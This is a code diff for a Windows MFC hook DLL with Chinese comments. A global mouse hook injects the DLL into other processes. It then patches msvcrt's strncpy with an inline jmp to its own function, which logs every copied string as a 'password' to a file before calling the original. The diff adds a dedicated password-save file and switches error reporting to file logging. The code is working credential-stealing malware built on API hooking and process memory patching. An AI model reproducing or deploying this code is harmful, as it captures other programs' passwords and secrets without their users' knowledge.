@@ -40,52 +40,44 @@ CHookApp theApp;
 //不同Instance共享的该变量
 #pragma data_seg("SHARED")
 static HHOOK  hhk=NULL; //鼠标钩子句柄
-static HINSTANCE hinst=NULL; //本dll的实例句柄 (hook.dll)
+static HINSTANCE hinst=NULL; //本dll的实例句柄 (Hook.dll)
 #pragma data_seg()
 #pragma comment(linker, "/section:SHARED,rws")
 //以上的变量共享哦!
-
-CString temp; //用于显示错误的临时变量
 bool bHook=false; //是否Hook了函数
 bool m_bInjected=false; //是否对API进行了Hook
 BYTE OldCode[5]; //老的系统API入口代码
 BYTE NewCode[5]; //要跳转的API代码 (jmp xxxx)
-typedef char* (*Sysstrncpy)(char* strDest,const char* strSource, size_t count);//add.dll中的add函数定义
-Sysstrncpy sysstrncpy; //ntwdblib.dll中的strncpy函数
+typedef char* (*Sysstrncpy)(char* strDest,const char* strSource, size_t count);//msvcrt.dll中的strncpy函数定义
+Sysstrncpy sysstrncpy; //msvcrt.dll中的strncpy函数
 HANDLE hProcess=NULL; //所处进程的句柄
-FARPROC pfstrncpy;  //指向add函数的远指针
+FARPROC pfstrncpy;  //指向strncpy函数的远指针
 DWORD dwPid;  //所处进程ID
 //日志文件
-RcLogInfo rl;
-//end of 变量定义
+RcLogInfo log;
+//密码保存文件
+RcLogInfo hook;
 
+//end of 变量定义
 //函数定义
 void HookOn(); //开启钩子
 void HookOff(); //关闭钩子
 LRESULT CALLBACK MouseProc(int nCode,WPARAM wParam,LPARAM lParam); //鼠标钩子函数
 void Inject(); //具体进行注射，替换入口的函数
-char* Mystrncpy(char* strDest,const char* strSource, size_t count); //我们定义的新的add()函数
+char* Mystrncpy(char* strDest,const char* strSource, size_t count); //我们定义的新的strncpy()函数
 BOOL InstallHook(); //安装钩子函数
 void UninstallHook(); //卸载钩子函数
-char cPath[MAX_PATH];
 //end of 函数定义
+
 
 
 BOOL CHookApp::InitInstance() 
 {
-	
-    FILE *m_pfLogFile = fopen("C:\\hook.log","at+");
-    if(NULL == m_pfLogFile)
-    {
-		AfxMessageBox(_TEXT("file open failed!"));
-        return 1;
-    }
+	if (!log.openFile("\\reject.log")){
+		return false;
+	}
 
-    rl.SetLogFile(m_pfLogFile);
-
-
-    rl.WriteLogInfo("hook.dll begin instance...\n");
-
+	log.WriteLogInfo("remote dll begin install");
 	//获取自身dll句柄
 	hinst=::AfxGetInstanceHandle();
 	//获取所属进程id和句柄
@@ -93,6 +85,8 @@ BOOL CHookApp::InitInstance()
 	hProcess=OpenProcess(PROCESS_ALL_ACCESS,0,dwPid); 
 	//调用函数注射
 	Inject();
+
+	log.closeFile();
 
 	return CWinApp::InitInstance();
 }
@@ -114,12 +108,14 @@ BOOL InstallHook()
 	if (hhk==NULL)
 	{
 		DWORD err=::GetLastError();
-		temp.Format(_TEXT("hook install failed!:%d"),err);
-		AfxMessageBox(temp);
+		char temp[MAX_PATH];
+		sprintf(temp, "[error %d] : hook SetWindowsHookEx()\n", err);
+		log.WriteLogInfo(temp);
 		return false;
 	}
 
-	AfxMessageBox(_TEXT("hook installed!"));
+	log.WriteLogInfo("hool installed!!\n");
+
 	return true;
 }
 
@@ -128,7 +124,8 @@ void UninstallHook()
 	if (hhk!=NULL){
 		::UnhookWindowsHookEx(hhk);
 	}
-	printf("Unhooked!\n");
+
+	log.WriteLogInfo("Unhooked!!\n");
 }
 
 void Inject()
@@ -139,29 +136,28 @@ void Inject()
 		m_bInjected=true;
 
 		HMODULE hmod = LoadLibraryA("msvcrt.dll");
-		char log[MAX_PATH]={'\0'};
-		sprintf(log, "msvcrt addr : 0x%x\n", (DWORD)hmod);
-
-		rl.WriteLogInfo(log);
+		char tmp[MAX_PATH]={'\0'};
+		sprintf(tmp, "msvcrt addr : 0x%x\n", (DWORD)hmod);
+		log.WriteLogInfo(tmp);
 
 		if (!hmod){
-			rl.WriteLogInfo("dll can't load\n");
+			log.WriteLogInfo("dll can't load\n");
 		}
 		sysstrncpy=(Sysstrncpy)::GetProcAddress(hmod,"strncpy");
 		if (!sysstrncpy){
-			rl.WriteLogInfo("strncpy can't find\n");
+			log.WriteLogInfo("strncpy can't find\n");
 		}
 
-		sprintf(log, "strncpy addr : 0x%x\n", (DWORD) sysstrncpy);
-		rl.WriteLogInfo(log);
+		sprintf(tmp, "strncpy addr : 0x%x\n", (DWORD) sysstrncpy);
+		log.WriteLogInfo(tmp);
 
 		//test function
 		char buf[8];
 		sysstrncpy(buf, "1234567", 7);
 		if (buf[0] == '1'){
-			rl.WriteLogInfo("函数执行成功\n");
+			log.WriteLogInfo("strncpy excute success!!\n");
 		}else{
-			rl.WriteLogInfo("函数执行失败\n");
+			log.WriteLogInfo("strncpy excute failed!!\n");
 		}
 
 
@@ -170,12 +166,12 @@ void Inject()
 
 		if (pfstrncpy==NULL)
 		{
-			rl.WriteLogInfo("cannot locate strncpy()\n");
+			log.WriteLogInfo("cannot locate strncpy()\n");
 		}
 
 
 
-		rl.WriteLogInfo("begin alter function\n");
+		log.WriteLogInfo("begin alter function\n");
 		// 将add()的入口代码保存到OldCode里
 		_asm 
 		{ 
@@ -197,7 +193,7 @@ void Inject()
 				mov dword ptr [NewCode+1],eax 
 		} 
 
-		rl.WriteLogInfo("end alter funtion\n");
+		log.WriteLogInfo("end alter funtion\n");
 		//填充完毕，现在NewCode[]里面就相当于指令 jmp Myadd
 		HookOn();
 	}
@@ -208,19 +204,20 @@ char* Mystrncpy(char* strDest,const char* strSource, size_t count)
 {
 	//password.Format(_T("password : %s"), strSource);
 
-	char log[MAX_PATH]={'\0'};
-	sprintf(log, "password : %s\n", strSource);
+	hook.openFile("\\hook");
+	char tmp[MAX_PATH]={'\0'};
+	sprintf(tmp, "password:%s\n", strSource);
+	hook.WriteLogInfo(tmp);
+	hook.closeFile();
 
-	rl.WriteLogInfo(log);
+	//截获了对strncpy()的调用，我们给a,b都加1
 
-	//截获了对add()的调用，我们给a,b都加1
-
-	HookOff();//关掉Myadd()钩子防止死循环
+	HookOff();//关掉Mystrncpy()钩子防止死循环
 
 	char* ret;
 	ret=sysstrncpy(strDest,strSource, count);
 
-	HookOn();//开启Myadd()钩子
+	HookOn();//开启Mystrncpy()钩子
 
 	return ret;
 }
@@ -241,7 +238,7 @@ LRESULT CALLBACK MouseProc(
 void HookOn() 
 { 
 	if(hProcess==NULL){
-		rl.WriteLogInfo("hprocess is null\n");
+		log.WriteLogInfo("hprocess is null\n");
 	}
 
 	DWORD dwTemp=0;
@@ -249,15 +246,15 @@ void HookOn()
 
 	//将内存保护模式改为可写,老模式保存入dwOldProtect
 	if (!VirtualProtectEx(hProcess,pfstrncpy,5,PAGE_READWRITE,&dwOldProtect)){
-		rl.WriteLogInfo("保存老模式失败\n");
+		log.WriteLogInfo("VirtualProtectEx failed\n");
 	}
 	//将所属进程中add的前5个字节改为Jmp Myadd 
 	if (!WriteProcessMemory(hProcess,pfstrncpy,NewCode,5,0)){
-		rl.WriteLogInfo("跳转 failed\n");
+		log.WriteLogInfo("WriteProcessMemory failed\n");
 	}
 	//将内存保护模式改回为dwOldProtect
 	if (!VirtualProtectEx(hProcess,pfstrncpy,5,dwOldProtect,&dwTemp)){
-		rl.WriteLogInfo("改回来 failed\n");
+		log.WriteLogInfo("VirtualProtectEx failed\n");
 	}
 
 
